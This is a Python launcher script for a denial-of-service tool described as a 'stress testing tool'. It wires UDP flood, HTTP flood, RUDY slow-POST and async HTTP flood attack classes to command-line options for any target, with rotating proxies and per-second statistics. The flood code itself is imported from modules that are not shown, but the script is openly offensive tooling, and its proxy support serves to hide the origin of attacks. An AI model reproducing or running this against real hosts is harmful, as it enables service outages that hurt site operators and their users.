#!/usr/bin/env python3
import argparse
import json
import sys
import time

from attacks import UDPFlood, HTTPFlood, RUDY, HTTPAsyncFlood
from core.proxy import ProxyManager
from core.stats import StatsMonitor

METHODS = {
    "udp": UDPFlood,
    "http": HTTPFlood,
    "rudy": RUDY,
    "http-async": HTTPAsyncFlood,
}

def main():
    parser = argparse.ArgumentParser(description="Advanced stress testing tool")
    parser.add_argument("--method", required=True, choices=METHODS.keys())
    parser.add_argument("--target", required=True)
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument("--threads", type=int, default=32)
    parser.add_argument("--duration", type=int, default=60)
    parser.add_argument("--rps", type=int, default=0)
    parser.add_argument("--proxy-file")
    parser.add_argument("--json", action="store_true")
    parser.add_argument("--payload-size", type=int, default=1024)
    parser.add_argument("--path", default="/")
    args = parser.parse_args()

    pm = None
    if args.proxy_file:
        pm = ProxyManager(args.proxy_file)
        print(f"[*] Loaded {len(pm.proxies)} proxies")

    attack_class = METHODS[args.method]
    attack = attack_class(
        target=args.target,
        port=args.port,
        threads=args.threads,
        duration=args.duration,
        rps=args.rps,
        proxy_manager=pm,
        payload_size=args.payload_size,
        path=args.path
    )

    monitor = StatsMonitor(attack, interval=1.0, json_output=args.json)
    monitor.start()

    print(f"[*] Starting {args.method.upper()} attack on {args.target}:{args.port}")
    stats = attack.start()

    if args.json:
        print(json.dumps(stats))
    else:
        elapsed = stats["end_time"] - stats["start_time"]
        print(f"\n[✓] Done. Total requests: {stats["requests"]} | "
              f"Elapsed: {elapsed:.1f}s | "
              f"Avg PPS: {stats["requests"]/elapsed:.1f} | "
              f"Errors: {stats["errors"]}")

if __name__ == "__main__":
    main()
